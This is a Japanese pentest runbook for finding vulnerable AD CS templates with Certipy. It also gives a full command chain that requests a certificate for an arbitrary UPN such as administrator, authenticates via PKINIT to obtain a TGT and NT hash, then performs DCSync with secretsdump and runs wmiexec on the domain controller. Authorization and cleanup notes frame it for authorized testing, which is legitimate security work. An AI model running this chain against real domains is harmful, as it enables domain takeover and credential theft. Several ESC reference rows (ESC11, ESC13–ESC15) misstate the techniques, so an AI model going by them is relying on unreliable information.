# AD CS 列挙 — Certipy による脆弱テンプレート発見

> **スコープ**: AD CS（Active Directory 証明書サービス）の脆弱テンプレート・CA 設定を Certipy で列挙し、悪用可能な ESC 番号を特定する。列挙フェーズは低リスク。証明書発行・CA 設定変更は各 ESC ファイルを参照。

> **[HIGH IMPACT]** 列挙自体は低リスクだが、ESC を悪用した証明書発行は書面承認必須：
> - [x] 持続化に該当（証明書は有効期限まで認証に使用可能）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（列挙自体は低リスク）
> - [ ] 不可逆な設定変更を含む（列挙のみなら変更なし）
>
> 演習環境では制約なし。

## 着火条件

- AD 環境にドメインユーザーとしてアクセスできる状態にある
- `ntlmrelayx.md` Step 5 で ESC8 を試みようとしている（WebEnrollment エンドポイントの存在確認が必要）
- BloodHound で `ADCS` ノードまたは `CertAuthority` 関連エッジが表示された
- Coerce 系や NTLM リレーの次の手として AD CS を評価したい

## 環境前提
- 実行環境: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- 必要なツール: `certipy`（`pip install certipy-ad --break-system-packages`。ペネトレ用 Linux ディストリには標準搭載されていない場合が多い）
- 必要な権限: ドメインユーザー認証情報（低権限ユーザーで可）

## 先に確認すること

**ESC 番号クイックリファレンス:**

| ESC | 概要 | 着火の核心条件 | 詳細 |
|-----|------|--------------|------|
| ESC1 | ENROLLEE_SUPPLIES_SUBJECT + Client Auth | 低権限ユーザーが任意の UPN で証明書を申請できる | `ESC1.md` |
| ESC2 | Any Purpose EKU / SubCA テンプレート | Any Purpose または EKU なしで低権限ユーザーが登録できる | `ESC2.md` |
| ESC3 | Enrollment Agent テンプレートチェーン | 代理申請権限を持つ証明書を取得し、任意ユーザー名で証明書を発行 | `ESC3.md` |
| ESC4 | テンプレートオブジェクトへの Write ACL | 低権限ユーザーがテンプレートの属性を書き換えて ESC1 化する | `ESC4.md` |
| ESC5 | PKI オブジェクトへの Write ACL | CA オブジェクト・PKI コンテナへの不適切な書き込み権限 | `ESC5.md` |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 CA フラグ | CA 全体で SAN 自由指定が有効（テンプレート設定を上書き）| `ESC6.md` |
| ESC7 | CA ACL（ManageCA / ManageCertificates）| 低権限ユーザーが CA を管理・証明書を強制発行できる | `ESC7.md` |
| ESC8 | NTLM Relay to WebEnrollment（HTTP）| DC$ の認証を HTTP エンドポイントにリレーして DC 証明書取得 | `ESC8.md` |
| ESC9 | No Security Extension | SID バインドなし証明書 + GenericWrite(UPN) → 標的 UPN で証明書取得 | `ESC9.md` |
| ESC10 | Weak Certificate Mappings | `StrongCertificateBindingEnforcement` が 0 または 1 → UPN ベースマッピング悪用 | `ESC10.md` |
| ESC11 | IF_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME + PEND | 承認待ちテンプレートを ManageCertificates 権限で強制発行 | `ESC11.md` |
| ESC12 | EDITF_ATTRIBUTESUBJECTALTNAME2 + CA シェル | CA サーバーへのシェルアクセスでフラグを設定して ESC6 相当を有効化 | `ESC12.md` |
| ESC13 | DCOM / RPC / CES 経由の証明書発行 | HTTP WebEnrollment が無効な環境で RPC/CES を経由して証明書を取得 | `ESC13.md` |
| ESC14 | Issuance Policies OID グループリンク | `msDS-OIDToGroupLink` で特権グループにリンクされた OID を持つテンプレートで証明書取得 | `ESC14.md` |
| ESC15 | Cross CA Enrollment + 信頼チェーン悪用 | 複数 CA・クロスフォレスト信頼環境で別 CA の脆弱テンプレートを使い別フォレストに認証 | `ESC15.md` |

**攻撃者の思考トレース:** AD CS は証明書ベースの Kerberos 認証（PKINIT）を提供する。証明書でドメインコントローラー自身として TGT を取得できれば DCSync が直接開ける。証明書は NTLM ハッシュより長命（デフォルト 1 年）でパスワードリセット後も有効なため、持続化経路として価値が高い。

---

## 1. Certipy による脆弱テンプレート列挙

**コマンド:**

```bash
# [Attacker] 標準出力に脆弱テンプレートのみ表示（最速確認）
certipy find \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout

# [Attacker] JSON + BloodHound 用 zip を出力（詳細調査・共有用）
certipy find \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -output [OUTPUT_PREFIX]
# → [OUTPUT_PREFIX].json と [OUTPUT_PREFIX]_BloodHound.zip が生成される

# [Attacker] NT ハッシュ認証で列挙（Pass-the-Hash）
certipy find \
  -u [USER]@[DOMAIN] \
  -hashes :[NT_HASH] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

**各フィールドの判断ポイント:**

| フィールド | 確認内容 | 悪用条件 |
|-----------|---------|---------|
| `Client Authentication` | True → Kerberos 認証に使用できる | True であること（ESC1/ESC2/ESC3/ESC6）|
| `Enrollee Supplies Subject` | True → 申請者が Subject/SAN を自由に指定できる | True + Client Auth → ESC1 |
| `Any Purpose` | True → EKU が Any Purpose（何にでも使える）| → ESC2 |
| `Enrollment Agent` | True → 代理申請として使える | → ESC3 の第1ステップ |
| `Requires Manager Approval` | False → 即時発行（管理者承認なし）| False であること（大半の ESC）|
| `Authorized Signatures Required` | 0 → 署名なしで申請可能 | 0 であること（大半の ESC）|
| `Enrollment Rights` | 低権限グループが含まれる | 低権限グループが列挙されること |
| `[!] Vulnerabilities` | certipy が特定した ESC 番号と理由 | 直接確認 |

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[!] Vulnerabilities: ESC1` | ESC1 が悪用可能 | `ESC1.md` |
| `User Specified SAN: Enabled`（CA レベル）| ESC6 が悪用可能 | `ESC6.md` |
| `Vulnerabilities` セクションがどのテンプレートにもない | 管理者が設定を修正済み | ESC8（WebEnrollment HTTP）を別途 `curl -k http://[CA_SERVER]/certsrv/` で確認 |
| `certipy find` でテンプレートが返ってこない | AD CS がインストールされていない | `nxc ldap [DC_IP] -u [USER] -p [PASSWORD] -M adcs` で存在確認 |

---

## 2. 共通フロー: 証明書取得 → PKINIT → NT ハッシュ → DCSync

ESC1 / ESC2 / ESC3 / ESC6 / ESC7 で証明書を取得した後の手順はほぼ共通。

**事前準備（必須）:** DC との時刻同期（Kerberos は時刻ずれ ±5 分以内が必要）

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

**コマンド:**

```bash
# [Attacker] Step 1: 証明書発行（ESC 種別によりオプション異なる。各 ESC ファイル参照）
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -upn [TARGET_UPN]        # 例: administrator@example.local
# → [TARGET_USER].pfx が生成される

# [Attacker] Step 2: 証明書で PKINIT 認証 → TGT + NT ハッシュ同時取得
certipy auth \
  -pfx [TARGET_USER].pfx \
  -dc-ip [DC_IP]
# → TGT と NT ハッシュが出力される

# [Attacker] Step 3: NT ハッシュで DCSync
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/[TARGET_USER]@[DC_IP]

# [Attacker] TGT で Pass-the-Ticket 経由でコマンド実行
export KRB5CCNAME=[TARGET_USER].ccache
impacket-wmiexec -k -no-pass -target-ip [DC_IP] [DOMAIN]/[TARGET_USER]@[DC_FQDN]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| NT ハッシュが出力される | PKINIT 認証成功 | DCSync → `../Credential_Dumping.md` |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | DC が PKINIT をサポートしていない | `gettgtpkinit.py`（PKINITtools）へのフォールバックを試す |
| 時刻同期エラー（Clock skew）| 時刻ずれが 5 分超 | `sudo ntpdate -u [DC_IP]` で再同期 |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| `certipy find` でテンプレートが返ってこない | AD CS がインストールされていない可能性。`nxc ldap [DC_IP] -u [USER] -p [PASSWORD] -M adcs` で存在確認 |
| `Vulnerabilities` セクションがどのテンプレートにもない | 管理者が設定を修正済み。ESC8（WebEnrollment HTTP 存在確認）は別途 `curl -k http://[CA_SERVER]/certsrv/` で確認 |
| `certipy auth` が `KDC_ERR_PADATA_TYPE_NOSUPP` | `gettgtpkinit.py`（PKINITtools）へのフォールバックを試す |
| `certipy find` 実行後に MDI アラートが出た | 列挙行為が検知されている。本番ではスコープ確認 |

---

## 本番での前提

- **事前合意の要否**: ★★（列挙のみ：口頭確認可）/ ★★★（証明書発行・CA 設定変更：書面承認必須）
- **想定されるSIEM/EDR検知**: Event ID 4886（証明書の要求受信）/ 4887（証明書の発行）/ 4768（TGT 要求）/ MDI「AD CS 関連の不審な証明書要求」アラート
- **業務影響リスク**: 列挙は業務影響なし。証明書発行は CA ログに記録されるが業務停止リスクは低い
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効（`certipy ca -revoke [SERIAL] -ca [CA_NAME]`）/ ✅ 取得した NT ハッシュ・TGT・pfx ファイルの暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD 侵入後列挙（ドメインユーザー取得）→ `../Enumeration_Checklist.md`
- 前：NTLM リレー起点からの ESC8 評価 → `../NTLM_Relay/ntlmrelayx.md`（§5）
- 前：Coerce 系で DC$ 認証を強制（ESC8 との組み合わせ）→ `../NTLM_Relay/Coerce.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- 後：各 ESC の詳細手順 → `ESC1.md` / `ESC2.md` / `ESC3.md` / `ESC4.md` / `ESC5.md` / `ESC6.md` / `ESC7.md` / `ESC8.md` / `ESC9.md` / `ESC10.md` / `ESC11.md` / `ESC12.md` / `ESC13.md` / `ESC14.md` / `ESC15.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
